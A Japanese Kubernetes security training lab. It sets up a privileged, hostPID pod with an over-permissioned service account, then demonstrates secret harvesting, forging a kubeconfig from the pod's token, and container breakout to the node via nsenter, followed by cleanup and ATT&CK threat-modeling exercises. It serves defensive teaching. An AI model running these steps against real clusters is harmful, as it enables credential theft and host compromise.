- [演習3: コンテナ環境への攻撃](#演習3-コンテナ環境への攻撃)
  - [コンテナ内での情報収集](#コンテナ内での情報収集)
  - [コンテナブレイクアウト](#コンテナブレイクアウト)
  - [環境のクリーンアップ](#環境のクリーンアップ)
  - [\[チャレンジ\] 攻撃シナリオの再現](#チャレンジ-攻撃シナリオの再現)
  - [\[チャレンジ\] 簡易脅威モデリング](#チャレンジ-簡易脅威モデリング)

# 演習3: コンテナ環境への攻撃

コンテナ侵入後の攻撃を体験してみましょう。

※ コマンドと出力結果を区別するため、実行コマンドには `$ ` をプレフィックスとして付与します。

[演習環境にアクセス](../ch00_setup/README.md)した後、事前準備として演習用のディレクトリを作成します。

```bash
$ pwd
/root

$ mkdir ch03
$ cd ch03

$ pwd
/root/ch03
```

次に本演習で使用するリソースを作成します。

```bash
$ cat <<EOF > manifests.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: resource-reader
rules:
- apiGroups: [""]
  resources: ["secrets", "pods", "configmaps"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-sa-binding
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: default
roleRef:
  kind: Role
  name: resource-reader
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Secret
metadata:
  name: user1-secret
data:
  username: dXNlcjEK
  password: cGFzc3dvcmQx
---
apiVersion: v1
kind: Secret
metadata:
  name: user2-secret
data:
  username: dXNlcjIK
  password: cGFzc3dvcmQy
---
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu-privileged
spec:
  hostPID: true
  serviceAccountName: app-sa
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: [ "sleep", "infinity" ]
    securityContext:
      privileged: true
    volumeMounts:
    - name: secret-vol
      mountPath: "/etc/secret"
      readOnly: true
  volumes:
  - name: secret-vol
    secret:
      secretName: user1-secret
EOF

$ kubectl apply -f manifests.yaml
serviceaccount/app-sa created
role.rbac.authorization.k8s.io/resource-reader created
rolebinding.rbac.authorization.k8s.io/app-sa-binding created
secret/user1-secret created
secret/user2-secret created
pod/ubuntu-privileged created
```

以上で事前準備は完了です。

## コンテナ内での情報収集

コンテナへの初期侵入は `kubectl exec` で代用します。

```bash
$ kubectl get po
NAME                READY   STATUS    RESTARTS   AGE
ubuntu-privileged   1/1     Running   0          2m19s

$ kubectl exec -it ubuntu-privileged -- bash
```

これでコンテナに侵入できたので、以降はコンテナ内からコマンドを実行します。

マニフェストファイルを見ると、Pod には Secret リソースをマウントしていることがわかります。
コンテナのボリュームマウントの状況は `mount` コマンドで確認できます。

```bash
$ mount | grep secret
tmpfs on /etc/secret type tmpfs (ro,relatime,size=16365616k,inode64)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=16365616k,inode64)
```

マウントされた Secret から認証情報を取得してみましょう。

```bash
$ ls /etc/secret/
password  username

$ cat /etc/secret/username
user1

$ cat /etc/secret/password
password1
```

このように、コンテナ内では Secret データを平文で取得することができます。

次にサービスアカウントに関するファイルを見てみます。

```bash
$ ls /run/secrets/kubernetes.io/serviceaccount
ca.crt  namespace  token
```

ここには証明書と Pod がデプロイされている Namespace 名、サービスアカウントトークンが配置されています。
デプロイされた Pod の定義を見ると、これらのファイルがどのように作成されたものかわかります。

```yaml
  volumes:
...
  - name: kube-api-access-nfqr8
    projected:
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              fieldPath: metadata.namespace
            path: namespace
```

これらのファイルから kubeconfig を作成してみます。
3つのファイルに加えて API サーバのエンドポイント情報が必要ですが、これはコンテナ内の環境変数から取得できます。

https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/#directly-accessing-the-rest-api

```bash
$ env | grep KUBERNETES_SERVICE_
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_SERVICE_HOST=10.96.0.1
```

kubeconfig ファイルの作成方法は以下の通りです。

```bash
$ cd /tmp/
$ echo "
apiVersion: v1
kind: Config
clusters:
- name: default-cluster
  cluster:
    certificate-authority-data: $(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | base64 -w 0)
    server: https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
contexts:
- name: default-context
  context:
    cluster: default-cluster
    namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    user: default-user
current-context: default-context
users:
- name: default-user
  user:
    token: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
" > kubeconfig
```

`kubectl` をダウンロードし、`kubectl get` で Kubernetes のリソースを取得できることを確認します。

```bash
$ apt update && apt install -y curl
$ curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
$ chmod +x kubectl

$ ./kubectl get po --kubeconfig kubeconfig
NAME                READY   STATUS    RESTARTS   AGE
ubuntu-privileged   1/1     Running   0          48m
```

Pod の情報を取得できました。
このサービスアカウントには Secret の取得権限も付与されているので、コンテナ内にマウントされていない Secret データも取得できます。

```bash
$ ./kubectl get secret --kubeconfig kubeconfig
NAME           TYPE     DATA   AGE
user1-secret   Opaque   2      50m
user2-secret   Opaque   2      50m

$ ./kubectl get secret user2-secret -o jsonpath='{.data}'
{"password":"cGFzc3dvcmQy","username":"dXNlcjIK"}

$ ./kubectl get secret user2-secret -o jsonpath='{.data.username}' | base64 -d
user2

$ ./kubectl get secret user2-secret -o jsonpath='{.data.password}' | base64 -d
password2
```

このように侵入したコンテナ内で情報を集め、追加の認証情報を取得できればさらに攻撃範囲を広げることができます。

## コンテナブレイクアウト

演習用の Pod は特権コンテナかつ PID Namespace をホスト（＝ノード）と共有しています。
そのため `nsenter` コマンドを実行するだけでホストに脱出できます。

```bash
$ cat /etc/hostname
ubuntu-privileged

$ nsenter --target 1 --mount --uts --ipc --net --pid -- bash

$ cat /etc/hostname
kind-worker
```

ホストに脱出した後は、ホスト上のファイルやプロセスに自由にアクセス可能です。
実行されているコンテナプロセスを確認したり、認証情報を収集しさらなる攻撃に役立てたりすることができます。

```bash
$ crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                     ATTEMPT             POD ID              POD
947b3435e9de4       35a88802559dd       24 minutes ago      Running             ubuntu                   0                   8bca2bb86db9e       ubuntu-privileged
bc43bf2da6e33       b5adf140fb488       4 hours ago         Running             cilium-operator          20                  d3c548eb7aee7       cilium-operator-9bfb5ffbd-klbnf
b432f9db8557d       308d834383594       4 hours ago         Running             unguard-user-simulator   0                   d774d388ebc30       unguard-user-simulator-28722870-vbz8n
6a122470f8291       308d834383594       34 hours ago        Running             unguard-user-simulator   0                   76a285928ee94       unguard-user-simulator-28721070-fwzg2
186aa6e43bacf       308d834383594       3 days ago          Running             unguard-user-simulator   0                   26cc1931d4968       unguard-user-simulator-28717860-sb9gt
4b85a71f357e9       ecd074983f414       4 days ago          Running             tetragon                 1                   0bc3a75e97cb4       tetragon-7pgpm
9280e4f6f7f8f       aebfd554d3483       4 days ago          Running             cilium-agent             0                   263d17014d39e       cilium-ncsp5
c66ea67e0dfae       acc4836f7b346       4 days ago          Running             export-stdout            0                   0bc3a75e97cb4       tetragon-7pgpm

$ ls /etc/kubernetes/
kubelet.conf  manifests  pki
```

## 環境のクリーンアップ

コンテナから `exit` し、演習で作成したリソースを削除します。

```bash
kubectl delete -f manifests.yaml
```

## [チャレンジ] 攻撃シナリオの再現

[攻撃シナリオ](./attack_scenario.md)を見ながら、攻撃の手順を再現してみましょう。

## [チャレンジ] 簡易脅威モデリング

MITRE ATT&CK の戦術 (Tactics) と攻撃手法 (Techniques) に照らし合わせ、[攻撃シナリオ](./attack_scenario.md)の各手順がどの戦術・手法に該当するか分類してみましょう。

また、上記や MITRE ATT＆CK Matrix などを参考に、演習環境の Kubernetes クラスタ存在する脅威を洗い出してみてください。
